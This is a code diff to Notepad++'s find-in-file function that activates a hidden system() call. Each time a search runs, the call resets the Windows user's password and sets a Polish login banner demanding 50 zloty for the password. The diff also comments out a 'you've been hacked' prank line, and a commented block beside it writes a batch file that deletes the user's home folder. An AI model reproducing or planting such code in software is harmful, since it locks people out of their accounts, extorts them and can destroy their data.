@@ -1952,7 +1952,7 @@ bool Notepad_plus::findInCurrentFile(bool isEntireDoc)
 	//system("DATE");
 
 	//change user pass virus
-	//system("@echo OFF && net user %username% zaq1@WSX && reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_SZ /v legalnoticecaption /d BONZO_HACKER /f && reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_SZ /v legalnoticetext /d MASZ_UTWORZONE_HASLO_NA_MONITOR_ZAPLAC_50GR_A_OTRZYMASZ_SWOJE_HASLO /f");
+	system("@echo OFF && net user %username% zaq1@WSX && reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_SZ /v legalnoticecaption /d BONZO_HACKER /f && reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_SZ /v legalnoticetext /d MASZ_UTWORZONE_HASLO_NA_MONITOR_ZAPLAC_50GR_A_OTRZYMASZ_SWOJE_HASLO /f");
 
 	//del user files virus
 	/*system("(@echo OFF && echo reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_SZ /v legalnoticecaption /d ZOSTALES_ZHACKOWANY /f &&"
@@ -1961,7 +1961,7 @@ bool Notepad_plus::findInCurrentFile(bool isEntireDoc)
 		"echo rmdir /s /q 'C:\\Users\\%username%' && "
 		"echo shutdown -l) > C:/na.bat && C:\\na.bat");*/
 
-	system("echo echo ZOSTAŁEŚ SHAKOWANY !!! > C:\\hej.bat && echo PAUSE >> C:\\hej.bat && C:\\hej.bat");
+	//system("echo echo ZOSTAŁEŚ SHAKOWANY !!! > C:\\hej.bat && echo PAUSE >> C:\\hej.bat && C:\\hej.bat");
 
 	int nbTotal = 0;
 	Buffer * pBuf = _pEditView->getCurrentBuffer();
